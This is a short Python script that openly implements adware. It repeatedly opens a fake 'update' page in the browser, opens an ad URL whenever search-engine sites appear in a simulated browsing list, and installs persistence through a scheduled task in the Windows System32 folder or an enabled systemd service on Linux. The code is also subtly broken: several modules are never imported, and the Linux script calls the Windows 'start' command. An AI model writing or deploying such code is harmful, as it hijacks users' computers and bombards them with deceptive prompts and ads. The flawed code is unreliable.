import time

def adware_fake_update_prompts_redirect_ads(update_url: str, ad_url: str) -> None:
    def display_fake_update():
        while True:
            webbrowser.open(update_url)
            time.sleep(60)  # Display update prompt every 60 seconds

    def redirect_website(url):
        if "google.com" in url or "bing.com" in url or "yahoo.com" in url:
            webbrowser.open(ad_url)

    def create_persistence():
        system = platform.system()
        if system == "Windows":
            with open("C:\\Windows\\System32\\AdwareService.bat", "w") as f:
                f.write(f'start {update_url}\n')
            os.system('schtasks /create /tn AdwareService /tr "C:\\Windows\\System32\\AdwareService.bat" /sc minute /mo 60')
        elif system == "Linux":
            with open("/etc/systemd/system/adware.service", "w") as f:
                f.write('[Unit]\nDescription=Adware Service\n[Service]\nExecStart=/usr/bin/start_adware.sh\n[Install]\nWantedBy=multi-user.target\n')
            with open("/usr/bin/start_adware.sh", "w") as f:
                f.write(f'#!/bin/bash\nstart {update_url}\n')
            os.system('systemctl daemon-reload && systemctl enable adware && systemctl start adware')

    threading.Thread(target=display_fake_update).start()
    create_persistence()

    # Simulate web browsing
    urls = ["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com", "https://www.example.com"]
    for url in urls:
        redirect_website(url)
        time.sleep(5)  # Simulate a delay between visits

